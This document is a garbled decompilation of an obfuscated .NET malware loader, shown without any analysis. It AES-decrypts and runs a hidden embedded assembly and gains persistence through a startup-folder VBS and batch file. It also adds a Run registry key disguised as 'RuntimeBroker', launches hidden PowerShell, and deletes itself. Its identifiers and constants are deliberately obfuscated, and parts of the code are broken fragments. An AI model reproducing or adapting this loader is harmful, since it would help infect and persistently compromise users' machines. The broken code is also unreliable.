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				 				 				 
				 
				 rawAssembly = transform(decrypt(input, Convert.FromBase64String("5at8j0kYXTuOaDORi0S7jOj+49wFgSM6wJqcg/DgDMw="), Convert.FromBase64String("nchtzuII+tzEzgZwn5FHTw==")));
				
				�\U0001f0d0�\U0001f1af�🕂�🄣 = Assembly.Load(rawAssembly);
				if (🝑🍑🅂🎇��🀐[0] != "DISABLED")
				 	continue;

				 new Thread(���\U0001f77d�🖒🖒��).Start();
				 		if (!(�🕂������🕂�[0] != "DISABLE2D"))
				 				continue;
				 		MethodInfo entryPoint = Assembly.Load(end entryPoint.Invoke(null, object[] 				 				 return;
				 {
				 		
					 entryPoint.Invoke(null, null);
					 					 		



			 Method begins at RVA 0x139f0
			 Header size: 12
			 Code size: 1797 (0x705)
			 if (path.Contains(Environment.GetFolderPath((Environment.SpecialFolder)<Module>.2B5F816E)))
			 			 loop start (head: IL_0016)
				 return (byte) 1
				 (no C# code)
				 return false;
			 end 			 
			 
			 
			 
			 Method begins at RVA 0x14104
			 Header size: 12
			 Code size: 24029 (0x5ddd)
			 string text = ".bat";
			 			
			text4 = 				 				 				 
			text2 = Environment.GetFolderPath((Environment.SpecialFolder)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(26, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) + "\\startup_str_" + text4 + text;
			text3 = Environment.GetFolderPath((Environment.SpecialFolder)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(26, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) + "\\startup_str_" + text4 + ".vbs";
			File.WriteAllText(text3, "CreateObject(Replace(\"WScript.Shell\",\"SubChar\",\"\")).Run \"\"\"" + text2 + "\"\"\", 0");
			File.Copy(batPath, text2, (byte)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) != 0);
				 	
			processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "powershell.exe";
			ProcessStartInfo processStartInfo2 = processStartInfo;
				 string[] 				 				 				 				 				 				 processStartInfo2.Arguments = string.Concat(				 				 				 processStartInfo.UseShellExecute = (byte)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) != 0;
				 				 				 processStartInfo.WindowStyle = (ProcessWindowStyle)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
				 				 				 Environment.Exit(-1);
				 				 				 Process.Start(processStartInfo)!.WaitForExit();
				 				 				 				 				 continue;
				 registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (byte)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue))))))))))))))))))))))))))))))))))))))))))))) != 0);
				 				 continue;
				 registryKey.SetValue("RuntimeBroker_startup_" + text4 + "_str", "wscript.exe \"" + text3 + "\"");
				 				 				 registryKey.Dispose();
				 				 				 Process.Start(text3);
				 				 				 if (batPath.IndexOf(text2, (StringComparison)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(5, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) == 0)
				 				 				 continue;
				 				 				 return;
				 (no C# code)
				 return;
			 end 			 Method begins at RVA 0x19ef0
			 Header size: 12
			 Code size: 2143 (0x85f)
			 WindowsIdentity current = WindowsIdentity.GetCurrent();
			 			 loop start (head: IL_000b)
				 				 windowsPrincipal = new WindowsPrincipal(current);
				 				 			 end 			 return windowsPrincipal.IsInRole((WindowsBuiltInRole)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(544, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
			 Method begins at RVA 0x1a75c
			 Header size: 12
			 Code size: 7783 (0x1e67)
			 int id = Process.GetCurrentProcess().Id;
			 			 loop start (head: IL_0010)
				 				 processStartInfo = new ProcessStartInfo();
				 				 				 processStartInfo.FileName = "powershell.exe";
				 				 				 processStartInfo.Arguments = "$a = [System.Diagnostics.Process]::GetProcessById(" + id + ");$b = $a.MainModule.FileName;$a.WaitForExit();Remove-Item -Force -Path $b;";
				 				 				 processStartInfo.UseShellExecute = (byte)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))))))) != 0;
				 				 				 processStartInfo.WindowStyle = (ProcessWindowStyle)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
				 				 			 end 			 return Process.Start(processStartInfo);
			 Method begins at RVA 0x1c5d0
			 Header size: 12
			 Code size: 3606 (0xe16)
			 MemoryStream stream = new MemoryStream(data);
			 			 loop start (head: IL_000c)
				 				 memoryStream = new MemoryStream();
				 				 				 				 				 				 				 while (true)
			 end 			 DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
				 deflateStream.CopyTo(memoryStream);
				 }
				 if (deflateStream != null)
				 				 loop start (head: IL_051f)
					 					 }
					 ((IDisposable)deflateStream).Dispose();
					 					 					 					 					 					 					 					 					 continue;
				 end 				 goto end_IL_051f;
			 return memoryStream.To			 Method begins at RVA 0x1d410
			 Header size: 12
			 Code size: 23411 (0x5b73)
			 if (��🀐��🝑��🆁)
			 			 loop start (head: IL_000f)
				 				 return;
				 				 				 continue;
				 thread.Start();
				 				 				 threadStart2 = null;
				 				 continue;
				 <>c__DisplayClass2 = new <>c__DisplayClass6();
				 				 				 <>c__DisplayClass2.bindedBytes = 				 				 				 if (threadStart2 != null)
				 				 				 				 				 				 continue;
				 threadStart2 = <>c__DisplayClass2.run_extra_program;
				 				 				 thread2 = new Thread(threadStart2);
				 				 continue;
				 thread2.Start();
				 				 				 				 				 				 if (				 				 while (true)
				 				 				 return;
				 (no C# code)
				 string[] 			 end 			 			 goto IL_000f;
			 			 			 			 			 			 continue;
			 threadStart = null;
			 			 continue;
			 <>c__DisplayClass = new <>c__DisplayClass9();
			 			 			 <>c__DisplayClass.Binded = 			 			 			 if (threadStart != null)
			 			 			 			 			 			 continue;
			 threadStart = <>c__DisplayClass.<runbinded>b__4;
			 			 			 thread = new Thread(threadStart);
			 			 continue;
			 			 			 			 🖯��📐�🅂�🔜.Add(thread);
			 			 			 			 			 			 if (			 			 continue;
			 			 			 			 			 			 return;
			 Method begins at RVA 0x22f90
			 Header size: 12
			 Code size: 7427 (0x1d03)
			 string[] 			 			 loop start (head: IL_000b)
				 				 return;
				 threadStart = null;
				 				 continue;
				 				 				 continue;
				 <>c__DisplayClassd = new <>c__DisplayClassd();
				 				 				 <>c__DisplayClassd.bindedBytes = 				 				 				 if (threadStart == null)
				 				 				 				 				 				 continue;
				 threadStart = <>c__DisplayClassd.<runbatbinded>b__b;
				 				 				 new Thread(threadStart).Start();
				 				 continue;
				 				 				 				 if (				 				 continue;
				 				 				 				 				 			 end 			 return;
			 Method begins at RVA 0x24ca0
			 Header size: 12
			 Code size: 8394 (0x20ca)
			 AesManaged aesManaged = new AesManaged();
			 			 loop start (head: IL_000b)
				 				 cryptoTransform = aesManaged.CreateDecryptor(key, iv);
				 				 				 aesManaged.Padding = (PaddingMode)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(2, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
				 				 				 result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
				 				 				 cryptoTransform.Dispose();
				 				 				 aesManaged.Dispose();
				 				 				 aesManaged.Mode = (CipherMode)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))));
				 				 			 end 			 return result;
			 Method begins at RVA 0x26d78
			 Header size: 12
			 Code size: 7 (0x7)
			 {
			 }
			 Method begins at RVA 0x26d8c
			 Header size: 12
			 Code size: 20435 (0x4fd3)
			 string[] 			 			 loop start (head: IL_0070)
				 				 return;
				 				 				 				 🝑🍑🅂🎇��🀐 = 				 				 				 				 				 				 �🕂������🕂� = 				 				 				 ��🀐��🝑��🆁 = false;
				 				 				 is_false_constant = false;
				 				 				 �🞇��🔣���🔜 = false;
				 				 				 �🝢���🄣🍑�� = new string[0];
				 				 				 �\U0001f0d0�\U0001f1af�🕂�🄣 = null;
				 				 				 🖯��📐�🅂�🔜 = new List<Thread>();
				 				 				 🖕🝑����🔣�� = false;
				 				 				 				 				 			 end 			 return;
